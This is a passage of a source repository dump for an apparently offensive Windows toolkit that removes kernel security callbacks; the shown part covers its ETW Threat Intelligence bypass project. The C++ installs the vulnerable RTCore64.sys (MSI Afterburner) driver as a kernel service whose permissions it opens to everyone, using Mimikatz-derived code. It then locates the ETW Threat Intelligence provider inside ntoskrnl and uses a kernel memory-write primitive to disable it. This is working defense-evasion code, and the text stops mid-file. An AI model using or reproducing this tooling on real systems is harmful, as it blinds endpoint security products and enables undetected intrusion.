Project Path: arc_V-i-x-x_kernel-callback-removal_3fmp5yil

Source Tree:

```txt
arc_V-i-x-x_kernel-callback-removal_3fmp5yil
├── ETWTIBypass
│   ├── ETWTIBypass
│   │   ├── ETWTI.cpp
│   │   ├── ETWTI.h
│   │   ├── ETWTIBypass.aps
│   │   ├── ETWTIBypass.cpp
│   │   ├── ETWTIBypass.filters
│   │   ├── ETWTIBypass.rc
│   │   ├── ETWTIBypass.user
│   │   ├── ETWTIBypass.vcxproj
│   │   ├── ETWTIBypass.vcxproj.user
│   │   ├── ETWTIUtil.h
│   │   ├── MemHandler.cpp
│   │   ├── MemHandler.h
│   │   ├── RCa10020
│   │   ├── memory.cpp
│   │   ├── memory.h
│   │   └── resource.h
│   ├── ETWTIBypass.sln
│   ├── Readme.md
│   ├── screenshots
│   │   ├── JumpToAddress.png
│   │   ├── RebaseProgram.png
│   │   ├── Rebasev2.png
│   │   └── crossReference.png
│   └── x64
│       └── Release
│           ├── ETWTIBypass.exe
│           ├── ETWTIBypass.pdb
│           └── RTCore64.sys
├── MiniFilterFileCallbackKernelBypass
│   ├── MiniFilterFileCallbackernelBypass
│   │   ├── FltDef.h
│   │   ├── FltUtil.cpp
│   │   ├── FltUtil.h
│   │   ├── MemHandler.cpp
│   │   ├── MemHandler.h
│   │   ├── MiniFilterFileCallbackernelBypass.aps
│   │   ├── MiniFilterFileCallbackernelBypass.cpp
│   │   ├── MiniFilterFileCallbackernelBypass.filters
│   │   ├── MiniFilterFileCallbackernelBypass.user
│   │   ├── MiniFilterFileCallbackernelBypass.vcxproj
│   │   ├── MiniFilterFileCallbackernelBypass.vcxproj.user
│   │   ├── RCa10020
│   │   ├── memory.cpp
│   │   └── memory.h
│   ├── MiniFilterFileCallbackernelBypass.sln
│   ├── Readme.md
│   └── x64
│       └── Release
│           ├── MiniFilterFileCallbackernelBypass.exe
│           ├── MiniFilterFileCallbackernelBypass.pdb
│           └── RTCore64.sys
├── NetworkKernelBypass
│   ├── NetworkCallbackKernelBypass
│   │   ├── MemHandler.cpp
│   │   ├── MemHandler.h
│   │   ├── NetworkCallbackKernelBypass.aps
│   │   ├── NetworkCallbackKernelBypass.cpp
│   │   ├── NetworkCallbackKernelBypass.filters
│   │   ├── NetworkCallbackKernelBypass.rc
│   │   ├── NetworkCallbackKernelBypass.user
│   │   ├── NetworkCallbackKernelBypass.vcxproj
│   │   ├── NetworkCallbackKernelBypass.vcxproj.user
│   │   ├── RCa10020
│   │   ├── memory.cpp
│   │   ├── memory.h
│   │   ├── net.h
│   │   ├── netUtil.cpp
│   │   ├── netUtil.h
│   │   └── resource.h
│   ├── NetworkCallbackKernelBypass.sln
│   ├── Readme.md
│   ├── screenshots
│   │   ├── ExportTable.png
│   │   ├── ExportTableInit.png
│   │   ├── JumpToAddress.png
│   │   ├── RebaseProgram.png
│   │   ├── Rebasev2.png
│   │   └── crossReference.png
│   └── x64
│       └── Release
│           └── RTCore64.sys
├── NotifyRoutineKernelBypass
│   ├── NotifyRoutineKernelBypass
│   │   ├── MemHandler.cpp
│   │   ├── MemHandler.h
│   │   ├── NotifyRoutineKernelBypass.aps
│   │   ├── NotifyRoutineKernelBypass.cpp
│   │   ├── NotifyRoutineKernelBypass.filters
│   │   ├── NotifyRoutineKernelBypass.rc
│   │   ├── NotifyRoutineKernelBypass.user
│   │   ├── NotifyRoutineKernelBypass.vcxproj
│   │   ├── NotifyRoutineKernelBypass.vcxproj.user
│   │   ├── RCa10020
│   │   ├── memory.cpp
│   │   ├── memory.h
│   │   ├── notifyRoutine.cpp
│   │   ├── notifyRoutine.h
│   │   ├── notifyRoutineUtil.h
│   │   ├── resource.h
│   │   └── x64
│   │       └── Release
│   │           ├── MemHandler.obj
│   │           ├── NotifyRo.973cd09d.tlog
│   │           │   ├── CL.command.1.tlog
│   │           │   ├── CL.read.1.tlog
│   │           │   ├── CL.write.1.tlog
│   │           │   ├── Cl.items.tlog
│   │           │   ├── NotifyRoutineKernelBypass.lastbuildstate
│   │           │   ├── link.command.1.tlog
│   │           │   ├── link.read.1.tlog
│   │           │   ├── link.secondary.1.tlog
│   │           │   └── link.write.1.tlog
│   │           ├── NotifyRoutineKernelBypass.Build.CppClean.log
│   │           ├── NotifyRoutineKernelBypass.exe.recipe
│   │           ├── NotifyRoutineKernelBypass.iobj
│   │           ├── NotifyRoutineKernelBypass.ipdb
│   │           ├── NotifyRoutineKernelBypass.log
│   │           ├── NotifyRoutineKernelBypass.obj
│   │           ├── NotifyRoutineKernelBypass.vcxproj.FileListAbsolute.txt
│   │           ├── memory.obj
│   │           ├── notifyRoutine.obj
│   │           └── vc143.pdb
│   ├── NotifyRoutineKernelBypass.sln
│   ├── Readme.md
│   ├── screenshots
│   │   ├── ExportTable.png
│   │   ├── ExportTableImage.png
│   │   ├── ExportTableInit.png
│   │   ├── ExportTableRegistry.png
│   │   ├── ExportTableThread.png
│   │   ├── JumpToAddress.png
│   │   ├── RebaseProgram.png
│   │   ├── Rebasev2.png
│   │   └── crossReference.png
│   └── x64
│       └── Release
│           ├── NotifyRoutineKernelBypass.exe
│           ├── NotifyRoutineKernelBypass.pdb
│           └── RTCore64.sys
├── RTCore64.sys
└── Readme.md

```

`ETWTIBypass/ETWTIBypass.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.11.35222.181
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ETWTIBypass", "ETWTIBypass\ETWTIBypass.vcxproj", "{973CD09D-B54A-4B52-8771-2EC18BB49241}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x64.ActiveCfg = Debug|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x64.Build.0 = Debug|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x86.ActiveCfg = Debug|Win32
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x86.Build.0 = Debug|Win32
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x64.ActiveCfg = Release|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x64.Build.0 = Release|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x86.ActiveCfg = Release|Win32
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {A8101FDA-9036-4CCC-AD4C-6D2CCC772522}
	EndGlobalSection
EndGlobal

```

`ETWTIBypass/ETWTIBypass/ETWTI.cpp`:

```cpp
#include "ETWTIUtil.h"
#include <tchar.h>

PVOID ETWTI::ResolveDriverBase(const wchar_t* strDriverName)
{
	DWORD szBuffer = 0x2000;
	BOOL bRes = FALSE;
	DWORD dwSizeRequired = 0;
	wchar_t buffer[256] = { 0 };
	LPVOID lpBase = NULL;
	HANDLE hHeap = GetProcessHeap();
	if (!hHeap) {
		return NULL;
	}

	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, szBuffer);
	if (!lpBuf) {
		return NULL;
	}

	bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
	if (!bRes) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSizeRequired);
		if (!lpBuf) {
			return NULL;
		}
		szBuffer = dwSizeRequired;
		bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
		if (!bRes) {
			printf("Failed to allocate space for device driver base array\n");
			return NULL;
		}
	}

	SIZE_T szNumDrivers = szBuffer / sizeof(PVOID);

	for (SIZE_T i = 0; i < szNumDrivers; i++) {
		PVOID lpBaseIter = ((LPVOID*)lpBuf)[i];
		GetDeviceDriverBaseNameW(lpBaseIter, buffer, 256);
		if (!lstrcmpiW(strDriverName, buffer)) {
			lpBase = lpBaseIter;
			break;
		}
	}

	HeapFree(hHeap, 0, lpBuf);
	return lpBase;
}

ETWTI::ETWTI(MemHandler* objMemHandlerArg)
{

	this->objMemHandler = objMemHandlerArg;
	this->lpNtosBase = this->ResolveDriverBase(L"ntoskrnl.exe");
	this->lpnetioBase = ResolveDriverBase(L"netio.sys");
}


BOOL ETWTI::EnumerateETW(BOOLEAN REMOVE, wchar_t* whattodo) {
	LPVOID StartSearch = NULL;
	LPVOID EndSearch = NULL;
	DWORD distance = 0;
	LPVOID pEtwThreat = NULL;
	HMODULE hNtosBase = LoadLibraryW(L"ntoskrnl.exe");
	if (!hNtosBase) {
		return NULL;
	}

	StartSearch = GetProcAddress(hNtosBase, "KeInsertQueueApc");
	EndSearch = (LPVOID) ((DWORD64) GetProcAddress(hNtosBase, "KeInsertQueueApc") + (DWORD64) 0x1000);

	printf("StartSearch %llx\n", StartSearch);
	 
	while (StartSearch <= EndSearch) {
		if ((((PBYTE)StartSearch)[0] == patternEtwThreatIntProvRegHandle[0]) && (((PBYTE)StartSearch)[1] == patternEtwThreatIntProvRegHandle[1]) && (((PBYTE)StartSearch)[2] == patternEtwThreatIntProvRegHandle[2]) && (((PBYTE)StartSearch)[3] == patternEtwThreatIntProvRegHandle[3]) && (((PBYTE)StartSearch)[4] == patternEtwThreatIntProvRegHandle[4]) && (((PBYTE)StartSearch)[5] == patternEtwThreatIntProvRegHandle[5])) {
			distance = *(PDWORD)((DWORD_PTR)StartSearch - 4);
			pEtwThreat = (LPVOID)((DWORD_PTR)StartSearch + distance); 
			break;
		}

		StartSearch = (LPVOID)((DWORD64)StartSearch + 0x01);
	}

	// Calculate offset
	DWORD Offset = (DWORD)pEtwThreat - (DWORD)hNtosBase;

	printf("Offset %llx\n", Offset);
	
	LPVOID pEtwRegEntry = NULL;
	BOOL b = this->objMemHandler->VirtualRead(
		(DWORD64)this->lpNtosBase + Offset,
		&pEtwRegEntry,
		sizeof(pEtwRegEntry)
	);
	if (!b) return FALSE;

	printf("[+] nt!_ETW_REG_ENTRY : %llx\n", (PDWORD64)pEtwRegEntry);

	LPVOID pEtwGuidEntry = NULL;
	b = this->objMemHandler->VirtualRead(
		(DWORD64)pEtwRegEntry + GuidEntry_OFFSET,
		&pEtwGuidEntry,
		sizeof(pEtwGuidEntry)
	);
	if (!b) return FALSE;

	printf("[+] nt!_ETW_REG_ENTRY : %llx\n", (PDWORD64)pEtwGuidEntry);
	
	DWORD isEnabled = 0;
	b = this->objMemHandler->VirtualRead(
		(DWORD64)pEtwGuidEntry + ProviderEnableInfo_OFFSET,
		&isEnabled,
		sizeof(isEnabled)
	);
	if (!b) return FALSE;

	if (whattodo != NULL && wcscmp(whattodo, (const wchar_t*)"check") == 0) {
		printf("[+] IsEnabled: %d\n", isEnabled);
	}
	else if (whattodo != NULL && wcscmp(whattodo, (const wchar_t*)"enable") == 0) {
		b = this->objMemHandler->WriteMemoryPrimitive(
			4,
			(DWORD64)pEtwGuidEntry + ProviderEnableInfo_OFFSET,
			0x01
		);
		if (!b) return FALSE;
	}
	else if (whattodo != NULL && wcscmp(whattodo, (const wchar_t*)"disable") == 0) {
		b = this->objMemHandler->WriteMemoryPrimitive(
			4,
			(DWORD64)pEtwGuidEntry + ProviderEnableInfo_OFFSET,
			0x00
		);
		if (!b) return FALSE;
	}
}

ETWTI::~ETWTI()
{
}

```

`ETWTIBypass/ETWTIBypass/ETWTI.h`:

```h
#pragma once
#define ASSERT_SZ( x, y ) static_assert(sizeof(x) == y, "incorrect size for " #x);

// begin usermode defs
#include <Windows.h>
#include <winternl.h>
```

`ETWTIBypass/ETWTIBypass/ETWTIBypass.cpp`:

```cpp
#include <Windows.h>
#include "memory.h"
#include "ETWTIUtil.h"

//Mimikatz code to load / unload driver
BOOL kull_m_service_addWorldToSD(SC_HANDLE monHandle) {
	BOOL status = FALSE;
	DWORD dwSizeNeeded;
	PSECURITY_DESCRIPTOR oldSd, newSd;
	SECURITY_DESCRIPTOR dummySdForXP;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	EXPLICIT_ACCESS ForEveryOne = {
		SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG | SERVICE_INTERROGATE | SERVICE_ENUMERATE_DEPENDENTS | SERVICE_PAUSE_CONTINUE | SERVICE_START | SERVICE_STOP | SERVICE_USER_DEFINED_CONTROL | READ_CONTROL,
		SET_ACCESS,
		NO_INHERITANCE,
		{NULL, NO_MULTIPLE_TRUSTEE, TRUSTEE_IS_SID, TRUSTEE_IS_WELL_KNOWN_GROUP, NULL}
	};
	if (!QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, &dummySdForXP, 0, &dwSizeNeeded) && (GetLastError() == ERROR_INSUFFICIENT_BUFFER)) {
		if (oldSd = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, dwSizeNeeded)) {
			if (QueryServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, oldSd, dwSizeNeeded, &dwSizeNeeded)) {
				if (AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, (PSID*)&ForEveryOne.Trustee.ptstrName)) {
					if (BuildSecurityDescriptor(NULL, NULL, 1, &ForEveryOne, 0, NULL, oldSd, &dwSizeNeeded, &newSd) == ERROR_SUCCESS) {
						status = SetServiceObjectSecurity(monHandle, DACL_SECURITY_INFORMATION, newSd);
						LocalFree(newSd);
					}
					FreeSid(ForEveryOne.Trustee.ptstrName);
				}
			}
			LocalFree(oldSd);
		}
	}
	return status;
}

DWORD service_install(PCWSTR serviceName, PCWSTR displayName, PCWSTR binPath, DWORD serviceType, DWORD startType, BOOL startIt) {
	BOOL status = FALSE;
	SC_HANDLE hSC = NULL, hS = NULL;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT | SC_MANAGER_CREATE_SERVICE)) {
		if (hS = OpenService(hSC, serviceName, SERVICE_START)) {
			wprintf(L"[+] \'%s\' service already registered\n", serviceName);
		}
		else {
			if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST) {
				wprintf(L"[*] \'%s\' service not present\n", serviceName);
				if (hS = CreateService(hSC, serviceName, displayName, READ_CONTROL | WRITE_DAC | SERVICE_START, serviceType, startType, SERVICE_ERROR_NORMAL, binPath, NULL, NULL, NULL, NULL, NULL)) {
					wprintf(L"[+] \'%s\' service successfully registered\n", serviceName);
					if (status = kull_m_service_addWorldToSD(hS))
						wprintf(L"[+] \'%s\' service ACL to everyone\n", serviceName);
					else printf("kull_m_service_addWorldToSD");
				}
				else PRINT_ERROR_AUTO(L"CreateService");
			}
			else PRINT_ERROR_AUTO(L"OpenService");
		}
		if (hS) {
			if (startIt) {
				if (status = StartService(hS, 0, NULL))
					wprintf(L"[+] \'%s\' service started\n", serviceName);
				else if (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING)
					wprintf(L"[*] \'%s\' service already started\n", serviceName);
				else {
					PRINT_ERROR_AUTO(L"StartService");
				}
			}
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	else {
		PRINT_ERROR_AUTO(L"OpenSCManager(create)");
		return GetLastError();
	}
	return 0;
}

BOOL kull_m_service_genericControl(PCWSTR serviceName, DWORD dwDesiredAccess, DWORD dwControl, LPSERVICE_STATUS ptrServiceStatus) {
	BOOL status = FALSE;
	SC_HANDLE hSC, hS;
	SERVICE_STATUS serviceStatus;

	if (hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (hS = OpenService(hSC, serviceName, dwDesiredAccess)) {
			status = ControlService(hS, dwControl, ptrServiceStatus ? ptrServiceStatus : &serviceStatus);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return status;
}

BOOL service_uninstall(PCWSTR serviceName) {
	if (kull_m_service_genericControl(serviceName, SERVICE_STOP, SERVICE_CONTROL_STOP, NULL)) {
		wprintf(L"[+] \'%s\' service stopped\n", serviceName);
	}
	else if (GetLastError() == ERROR_SERVICE_NOT_ACTIVE) {
		wprintf(L"[*] \'%s\' service not running\n", serviceName);
	}
	else {
		PRINT_ERROR_AUTO(L"kull_m_service_stop");
		return FALSE;
	}

	if (SC_HANDLE hSC = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_CONNECT)) {
		if (SC_HANDLE hS = OpenService(hSC, serviceName, DELETE)) {
			BOOL status = DeleteService(hS);
			CloseServiceHandle(hS);
		}
		CloseServiceHandle(hSC);
	}
	return TRUE;
}
// thanks gentilkiwi!

int main(int argc, char** argv) {
	if (argc < 2) {
		printf("Usage: %s\n"
			" /etw /check - check if ETW Enabled or Disabled \n"
			" /etw /enable - Enable ETW Kernel Provider \n"
			" /etw /disable - Disable ETW Kernel Provider \n"
			" /installDriver - Install the MSI driver\n"
			" /uninstallDriver - Uninstall the MSI driver\n"
			, argv[0]);
		return 0;
	}

	if (strcmp(argv[1] + 1, "installDriver") == 0) {
		const auto svcName = L"RTCore64";
		const auto svcDesc = L"Micro-Star MSI Afterburner";
		const wchar_t driverName[] = L"\\RTCore64.sys";
		const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
		TCHAR driverPath[pathSize];
		GetCurrentDirectory(pathSize, driverPath);
		wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));

		if (auto status = service_install(svcName, svcDesc, driverPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE) == 0x00000005) {
			wprintf(L"[!] 0x00000005 - Access Denied - Did you run as administrator?\n");
		}
		return 0;
	}
	else if (strcmp(argv[1] + 1, "uninstallDriver") == 0) {
		const auto svcName = L"RTCore64";
		const auto svcDesc = L"Micro-Star MSI Afterburner";
		const wchar_t driverName[] = L"\\RTCore64.sys";
		const auto pathSize = MAX_PATH + sizeof(driverName) / sizeof(wchar_t);
		TCHAR driverPath[pathSize];
		GetCurrentDirectory(pathSize, driverPath);
		wcsncat_s(driverPath, driverName, sizeof(driverName) / sizeof(wchar_t));
		service_uninstall(svcName);
		return 0;
	}

	Memory m = Memory();
	ETWTI oFlt = ETWTI(&m);

	if (!strcmp(argv[1] + 1, "etw") && !strcmp(argv[2] + 1, "check")) {
		oFlt.EnumerateETW(false, (wchar_t*) "check");
	}
	else if (!strcmp(argv[1] + 1, "etw") && !strcmp(argv[2] + 1, "disable")) {
		oFlt.EnumerateETW(false, (wchar_t*) "disable");
	}
	else if (!strcmp(argv[1] + 1, "etw") && !strcmp(argv[2] + 1, "enable")) {
		oFlt.EnumerateETW(false, (wchar_t*)"enable");
	}

	return 0;
}
```

`ETWTIBypass/ETWTIBypass/ETWTIBypass.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="MiniFilter Kernel Bypass.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="memory.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="FltUtil.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="MemHandler.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="FltUtil.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="PebLdr.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="FltDef.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="memory.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="MemHandler.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`ETWTIBypass/ETWTIBypass/ETWTIBypass.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//

#include "resource.h"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "winres.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE 9, 1

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE
BEGIN
    "resource.h\0"
END

2 TEXTINCLUDE  
BEGIN
    "#include ""winres.h""\r\n"
    "\0"
END

3 TEXTINCLUDE  
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED

```

`ETWTIBypass/ETWTIBypass/ETWTIBypass.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`ETWTIBypass/ETWTIBypass/ETWTIBypass.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{973cd09d-b54a-4b52-8771-2ec18bb49241}</ProjectGuid>
    <RootNamespace>ETWTIBypass</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="ETWTI.cpp" />
    <ClCompile Include="MemHandler.cpp" />
    <ClCompile Include="memory.cpp" />
    <ClCompile Include="ETWTIBypass.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="ETWTI.h" />
    <ClInclude Include="ETWTIUtil.h" />
    <ClInclude Include="MemHandler.h" />
    <ClInclude Include="memory.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`ETWTIBypass/ETWTIBypass/ETWTIBypass.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
